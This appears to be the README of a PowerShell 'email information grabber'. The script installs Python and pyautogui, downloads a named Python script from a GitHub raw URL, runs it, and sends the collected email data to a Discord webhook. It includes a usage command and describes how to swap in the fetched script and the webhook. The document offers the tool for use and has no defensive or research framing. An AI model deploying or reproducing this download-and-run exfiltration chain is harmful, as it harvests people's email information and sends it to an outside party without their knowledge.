# Python Email Information Grabber

This PowerShell script is designed to automate the process of downloading Python and its dependencies to run a Python script that collects email information. The Python script is specifically intended to be used with a Discord webhook for sending the collected data.

## Prerequisites
Before using this script, ensure you have the following:

- Windows operating system
- An active internet connection

## How to Use
1. Open a PowerShell terminal.
2. Save the script to a local file with a `.ps1` extension.
3. Run the script by calling the `Grab-Emails` function. Optionally, you can provide a Discord webhook URL as a parameter to the function if you want to customize it. If no webhook URL is provided, the script will use a default webhook URL.

```powershell
Grab-Emails -wbhk "YOUR DISCORD WEBHOOK HERE"
```

## Functionality
The script provides the following functionality:

1. **InstallPython**: Downloads and installs Python version 3.9.6 for Windows. If Python is already installed, it will skip this step.
2. **InstallPipPackages**: Installs the required Python packages - `requests` and `pyautogui` - using `pip3`.
3. **RunPythonScript**: Downloads the Python script from a GitHub repository and runs it using the installed Python.

## Notes
- If Python is already installed on your system, the script will not reinstall it and will proceed with the existing installation.
- If `pip` is not installed, the script will install it to ensure that the required packages are installed properly.
- The script uses a default Python script located in the GitHub repository: [Adv Email Info Grab & Upload/emailgrabber.py](https://raw.githubusercontent.com/calinux-py/Python/main/Adv%20Email%20Info%20Grab%20%26%20Upload/emailgrabber.py). If you want to use a different Python script, you can replace the URL in the `RunPythonScript` function.
- The script replaces the Discord webhook URL placeholder (`YOUR DISCORD WEBHOOK HERE`) in the Python script with the provided webhook URL, allowing you to customize the Discord channel to which the email information is sent. If no webhook URL is provided, the script will use the default placeholder.
